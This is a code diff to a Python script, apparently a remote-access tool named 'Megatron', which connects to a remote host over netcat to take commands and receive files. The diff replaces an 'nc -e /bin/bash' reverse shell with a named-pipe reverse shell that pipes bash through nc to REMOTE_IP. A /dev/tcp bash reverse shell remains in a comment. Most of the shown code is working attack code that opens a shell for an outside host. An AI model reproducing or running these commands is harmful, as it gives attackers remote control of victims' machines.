@@ -17,8 +17,10 @@ CMD_END_FILE = '-t'
 def main():
     print('Initialising main coms')
     process_main = subprocess.Popen(['nc', REMOTE_IP, PORT_MAIN], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, universal_newlines=True)   
+    sleep(1)    
     print('Initialising remote shell')
-    process_shell = subprocess.Popen(['nc', '-e', '/bin/bash', REMOTE_IP, PORT_SHELL], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, universal_newlines=True)
+    # process_shell = subprocess.Popen(['nc', '-e', '/bin/bash', REMOTE_IP, PORT_SHELL], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, universal_newlines=True)
+    process_shell = subprocess.Popen('rm /tmp/backpipe; mknod /tmp/backpipe p; /bin/bash 0</tmp/backpipe | nc ' + REMOTE_IP + ' ' + PORT_SHELL + ' 1>/tmp/backpipe', shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, universal_newlines=True)
     # process_shell = subprocess.Popen('bash -i >& /dev/tcp/' + REMOTE_IP + '/' + PORT_SHELL + ' 0>&1', shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, universal_newlines=True)
 
     if process_main.poll() is not None:
@@ -27,14 +29,14 @@ def main():
         print('Initialisation Successful')
     else:
         print('Megatron running, but shell appears faulty - reverse shell command is bad?')
-
+    print('-------------------------------------')
     while True:
         command = process_main.stdout.readline().rstrip()
         begin_file_update(command, process_main)
 
 
 def begin_file_update(command, process_main):
-    print('command = ' + command)
+    # print('command = ' + command)
     if command == CMD_NEW_FILE:
         file_name = process_main.stdout.readline().rstrip()
         print('Receiving: ' + file_name + ' .....', end='')
